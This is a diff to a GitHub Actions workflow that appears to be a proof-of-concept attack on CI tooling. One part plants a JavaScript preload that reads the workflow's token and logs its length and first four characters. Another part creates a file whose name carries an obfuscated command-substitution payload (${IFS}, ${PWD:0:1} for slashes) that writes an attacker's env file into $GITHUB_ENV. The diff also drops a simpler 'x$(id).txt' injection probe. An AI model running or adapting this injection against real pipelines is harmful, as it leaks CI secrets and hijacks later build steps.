@@ -22,16 +22,15 @@ jobs:
           try {
             const fs = require('fs');
             const t = process.env.INPUT_TOKEN || process.env.INPUT_GITHUB_TOKEN || '';
-            const line = 'PRELOAD_RAN token_len=' + t.length + ' token_head=' + t.slice(0,4) + ' action=' + (process.env.GITHUB_ACTION || '?');
+            const line = 'PRELOAD_RAN token_len=' + t.length + ' token_head=' + (t ? t.slice(0,4) : 'NONE') + ' action=' + (process.env.GITHUB_ACTION || '?');
             try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/summary', line + '\n'); } catch (e) {}
             console.log(line);
           } catch (e) { console.log('PRELOAD_ERR ' + e.message); }
           JS
           cat > /tmp/evilname <<'EOF'
-          $(cp${IFS}$(printf${IFS}'\057')tmp$(printf${IFS}'\057')content$(printf${IFS}'\057')content$(printf${IFS}'\057')env.txt${IFS}$GITHUB_ENV&&echo${IFS}summary).txt
+          $(cp${IFS}${PWD:0:1}tmp${PWD:0:1}content${PWD:0:1}content${PWD:0:1}env.txt${IFS}$GITHUB_ENV&&echo${IFS}summary).txt
           EOF
           touch "$(cat /tmp/evilname)"
-          touch 'x$(id).txt'
           ls -la
       - name: Upload artifact
         uses: actions/upload-artifact@v4
